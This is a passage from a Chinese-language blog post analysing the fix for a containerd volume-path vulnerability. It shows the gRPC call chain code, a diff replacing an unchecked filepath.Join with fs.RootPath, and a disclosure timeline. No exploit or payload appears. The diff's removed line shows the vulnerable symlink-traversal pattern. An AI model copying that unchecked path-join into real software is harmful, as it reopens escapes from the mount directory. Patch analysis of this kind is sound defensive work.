<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">c</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">Client</span>) <span style="color:#a6e22e">NewContainer</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">id</span> <span style="color:#66d9ef">string</span>, <span style="color:#a6e22e">opts</span> <span style="color:#f92672">...</span><span style="color:#a6e22e">NewContainerOpts</span>) (<span style="color:#a6e22e">Container</span>, <span style="color:#66d9ef">error</span>) {
    <span style="color:#f92672">...</span>
    <span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">ContainerService</span>().<span style="color:#a6e22e">Create</span>(<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">container</span>)
    <span style="color:#f92672">...</span>
}
</code></pre></div><p><a href="https://github.com/containerd/containerd/blob/v1.6.0/containerstore.go#L110">https://github.com/containerd/containerd/blob/v1.6.0/containerstore.go#L110</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">remoteContainers</span>) <span style="color:#a6e22e">Create</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">container</span> <span style="color:#a6e22e">containers</span>.<span style="color:#a6e22e">Container</span>) (<span style="color:#a6e22e">containers</span>.<span style="color:#a6e22e">Container</span>, <span style="color:#66d9ef">error</span>) {
    <span style="color:#a6e22e">created</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">Create</span>(<span style="color:#a6e22e">ctx</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">containersapi</span>.<span style="color:#a6e22e">CreateContainerRequest</span>{
        <span style="color:#a6e22e">Container</span>: <span style="color:#a6e22e">containerToProto</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">container</span>),
    })
    <span style="color:#f92672">...</span>
}
</code></pre></div><p>直到调用GRPC，由服务端执行<code>containerd.services.containers.v1.Containers</code>服务的<code>Create</code>方法。</p>
<p><a href="https://github.com/containerd/containerd/blob/v1.6.0/api/services/containers/v1/containers.pb.go#L729">https://github.com/containerd/containerd/blob/v1.6.0/api/services/containers/v1/containers.pb.go#L729</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">c</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">containersClient</span>) <span style="color:#a6e22e">Create</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">Context</span>, <span style="color:#a6e22e">in</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">CreateContainerRequest</span>, <span style="color:#a6e22e">opts</span> <span style="color:#f92672">...</span><span style="color:#a6e22e">grpc</span>.<span style="color:#a6e22e">CallOption</span>) (<span style="color:#f92672">*</span><span style="color:#a6e22e">CreateContainerResponse</span>, <span style="color:#66d9ef">error</span>) {
    <span style="color:#a6e22e">out</span> <span style="color:#f92672">:=</span> new(<span style="color:#a6e22e">CreateContainerResponse</span>)
    <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">cc</span>.<span style="color:#a6e22e">Invoke</span>(<span style="color:#a6e22e">ctx</span>, <span style="color:#e6db74">&#34;/containerd.services.containers.v1.Containers/Create&#34;</span>, <span style="color:#a6e22e">in</span>, <span style="color:#a6e22e">out</span>, <span style="color:#a6e22e">opts</span><span style="color:#f92672">...</span>)
    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>, <span style="color:#a6e22e">err</span>
    }
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">out</span>, <span style="color:#66d9ef">nil</span>
}
</code></pre></div><h2 id="八修复分析">八、修复分析</h2>
<h3 id="1-commit分析">1. commit分析</h3>
<p>根据github安全通告<a href="https://github.com/containerd/containerd/security/advisories/GHSA-crp2-qrr5-8pq7">GHSA-crp2-qrr5-8pq7</a>，修复版本为1.6.1, 1.5.10和1.4.13，因此可以比较修复版本和前一个版本的变化。</p>
<p><a href="https://github.com/containerd/containerd/compare/v1.6.0...v1.6.1">https://github.com/containerd/containerd/compare/v1.6.0...v1.6.1</a></p>
<p>仅有7个commit差异，可以快速分析出修复commit为</p>
<p><a href="https://github.com/containerd/containerd/commit/075cfdff68941fe30338ebe034fa67ce09fb4b55">https://github.com/containerd/containerd/commit/075cfdff68941fe30338ebe034fa67ce09fb4b55</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">    for _, mountPath := range mountPaths {
<span style="color:#f92672">-       src := filepath.Join(mountPath, volume)
</span><span style="color:#f92672"></span><span style="color:#a6e22e">+       src, err := fs.RootPath(mountPath, volume)
</span><span style="color:#a6e22e">+       if err != nil {
</span><span style="color:#a6e22e">+           return fmt.Errorf(&#34;rootpath on mountPath %s, volume %s: %w&#34;, mountPath, volume, err)
</span><span style="color:#a6e22e">+       }
</span><span style="color:#a6e22e"></span>        if _, err := os.Stat(src); err != nil {
            if os.IsNotExist(err) {
                // Skip copying directory if it does not exist.
</code></pre></div><p>仅修复了一个点，将路径拼接的函数由<code>filepath.Join</code>替换成了<code>fs.RootPath</code>。</p>
<hr>
<p><code>filepath.Join</code>是go提供的路径拼接函数，仅对路径进行拼接，不做任何校验。</p>
<p><code>fs.RootPath()</code>函数提供了以下功能的校验：</p>
<ol>
<li>递归遍历软链接，直到路径不再是软链接，才进行拼接。</li>
<li>拼接时避免了目录穿越</li>
</ol>
<p><a href="https://github.com/containerd/containerd/blob/v1.6.1/vendor/github.com/containerd/continuity/fs/path.go#L227">https://github.com/containerd/containerd/blob/v1.6.1/vendor/github.com/containerd/continuity/fs/path.go#L227</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#75715e">// RootPath joins a path with a root, evaluating and bounding any
</span><span style="color:#75715e">// symlink to the root directory.
</span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">RootPath</span>(<span style="color:#a6e22e">root</span>, <span style="color:#a6e22e">path</span> <span style="color:#66d9ef">string</span>) (<span style="color:#66d9ef">string</span>, <span style="color:#66d9ef">error</span>) {
    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span> {
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">root</span>, <span style="color:#66d9ef">nil</span>
    }
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">linksWalked</span> <span style="color:#66d9ef">int</span> <span style="color:#75715e">// to protect against cycles
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> {
        <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">linksWalked</span>
        <span style="color:#a6e22e">newpath</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">walkLinks</span>(<span style="color:#a6e22e">root</span>, <span style="color:#a6e22e">path</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">linksWalked</span>)
        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">err</span>
        }
        <span style="color:#a6e22e">path</span> = <span style="color:#a6e22e">newpath</span>
        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">linksWalked</span> {
            <span style="color:#a6e22e">newpath</span> = <span style="color:#a6e22e">filepath</span>.<span style="color:#a6e22e">Join</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#a6e22e">newpath</span>)
            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">newpath</span> {
                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">filepath</span>.<span style="color:#a6e22e">Join</span>(<span style="color:#a6e22e">root</span>, <span style="color:#a6e22e">newpath</span>), <span style="color:#66d9ef">nil</span>
            }
            <span style="color:#a6e22e">path</span> = <span style="color:#a6e22e">newpath</span>
        }
    }
}
</code></pre></div><p><code>walkLinks</code>函数分析略</p>
<p><a href="https://github.com/containerd/containerd/blob/v1.6.1/vendor/github.com/containerd/continuity/fs/path.go#L279">https://github.com/containerd/containerd/blob/v1.6.1/vendor/github.com/containerd/continuity/fs/path.go#L279</a></p>
<p>因此，修复后，volume路径即使是软链接，也被限制在<code>mountPath</code>下了，即<code>fs.RootPath()</code>函数名中<code>Root</code>的含义。</p>
<h2 id="附">附</h2>
<h3 id="时间线">时间线</h3>
<p>漏洞产生、发现、报告、修复、分析的时间线</p>
<ul>
<li>2021-11-22 作者Felix Wilhelm向containerd报告</li>
<li>2022-02-18 containerd要求宽限至3月7日公开</li>
<li>2022-03-03 containerd完成修复，并在GHSA发布漏洞通告</li>
<li>2022-03-04 我人工查阅GHSA捕获到漏洞情报</li>
<li>2022-03-07 我完成漏洞复现</li>
<li>2022-03-24 Google Project Zero 因达到90+30天期限公开漏洞报告</li>
<li>2022-03-26 我完成主要内容分析，主要时间花在调用链分析上</li>
<li>2022-03-29 博客公开本文</li>
<li>2022-04-27 公众号发布本文</li>
</ul>

            </div>
        </article>

        <hr />

        <div class="post-info">
  			</div>

        
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2022</span>
            
            <span></span>
            <span> <a href="/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">

        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="https://github.com/st0n3">st0n3</a></span>
            <span>Based on <a href="https://github.com/rhazdon">rhazdon</a></span>
        </div>
    </div>

    <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      extensions: ["tex2jax.js"],
      
      jax: ["input/TeX", "output/CommonHTML"],
      tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"] ],
        displayMath: [ ['$$','$$'], ["\\[","\\]"] ],
        processEscapes: true
      },
      "HTML-CSS": { fonts: ["TeX"] },
      displayAlign: "left"
    });
  </script>

<script async src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS-MML_CHTML"></script>


</footer>

            
        </div>

        




<script type="text/javascript" src="/bundle.min.4c3fb12a087ceed4a52cb5d57068a9795c7069617a01ca70f788052ad66e1791779e6c72686e1dc0ca13dc03b0203204b6566bb0dd1ee80de2b7ff4d8fe53db2.js" integrity="sha512-TD&#43;xKgh87tSlLLXVcGipeVxwaWF6Acpw94gFKtZuF5F3nmxyaG4dwMoT3AOwIDIEtlZrsN0e6A3it/9Nj&#43;U9sg=="></script>



    </body>
</html>
